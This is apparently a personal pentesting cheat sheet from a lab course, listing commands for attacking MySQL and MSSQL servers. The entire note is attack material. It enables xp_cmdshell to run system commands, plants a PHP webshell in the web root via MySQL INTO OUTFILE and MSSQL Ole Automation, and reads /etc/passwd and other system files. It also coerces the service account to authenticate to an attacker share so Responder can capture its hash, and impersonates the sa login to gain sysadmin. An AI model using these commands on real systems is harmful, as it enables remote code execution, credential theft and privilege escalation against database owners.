More ways to enumerate in [MySQL](obsidian://open?vault=Obsidian%20Vault&file=Footprinting%2FHOSTS%2FMySQL) or [MSSQL](obsidian://open?vault=Obsidian%20Vault&file=Footprinting%2FHOSTS%2FMSSQL)
```bash
# Banner grabbing 
nmap -Pn -sV -sC -p1433 10.10.10.125

# Connect to DB
mysql -u julio -pPassword123 -h 10.129.20.13
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h # MSSQL (use .\\user)

# Enable xp_cmdshell and run commands on MSSQL
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'

# Write and read files mysql 
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
select LOAD_FILE("/etc/passwd");

# Enable Ole Automation Procedures and write files 
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE

# Read file MSSQL
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

# Capture MSSQL service hash
EXEC master..xp_dirtree '\\10.10.110.17\share\'
EXEC master..xp_subdirs '\\10.10.110.17\share\'
sudo responder -I tun0

# Impersonate Existing Users with MSSQL

# Identify Users that We Can Impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

# Verifying our Current User and Role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# Impersonating the SA User, best to run within the master db (USE master)
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

```